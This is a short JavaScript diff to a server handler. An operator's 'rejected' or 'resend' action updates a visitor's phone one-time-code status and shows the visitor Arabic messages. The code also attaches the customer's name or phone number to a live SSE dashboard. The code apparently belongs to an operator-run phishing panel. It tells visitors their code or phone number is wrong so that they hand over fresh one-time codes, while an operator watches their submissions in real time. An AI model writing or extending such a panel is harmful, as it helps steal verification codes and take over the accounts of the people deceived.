@@ -896,18 +896,30 @@ async function startServer() {
         updateData.currentPage = "step4";
       } else if (action === "rejected") {
         updateData.phoneOtpStatus = "rejected";
-        updateData.phoneRejectionMessage = "تم رفض رمز الهاتف - يرجى المحاولة مرة أخرى";
+        updateData.phoneRejectionMessage = "رقم الهاتف غير صحيح - يرجى المحاولة مرة أخرى";
         updateData.phoneRejectionAt = new Date().toISOString();
       } else if (action === "resend") {
         updateData.phoneResendRequested = true;
         updateData.phoneResendAt = new Date().toISOString();
+        updateData.phoneRejectionMessage = "الرمز الذي ادخلته غير صحيح يرجى انتظار رمز جديد";
+        updateData.phoneOtpStatus = "pending";
       }
 
       // Update visitor data so customer can receive the update
       await upsertVisitor(visitorId, updateData);
       
-      // Update dashboard request
-      const dashboardData = await upsertDashboardRequest({ id: visitorId, ...updateData, updated: "تم التحديث الآن" });
+      // Get current visitor data to include customer name
+      const currentData = await readVisitor(visitorId);
+      const customerName = currentData?.ownerName || currentData?.phoneNumber || "زائر";
+      
+      // Update dashboard request with customer info
+      const dashboardData = await upsertDashboardRequest({ 
+        id: visitorId, 
+        visitorId: visitorId,
+        customer: customerName,
+        ...updateData, 
+        updated: "تم التحديث الآن" 
+      });
 
       // Broadcast to dashboard immediately
       broadcastSSE("update", dashboardData);
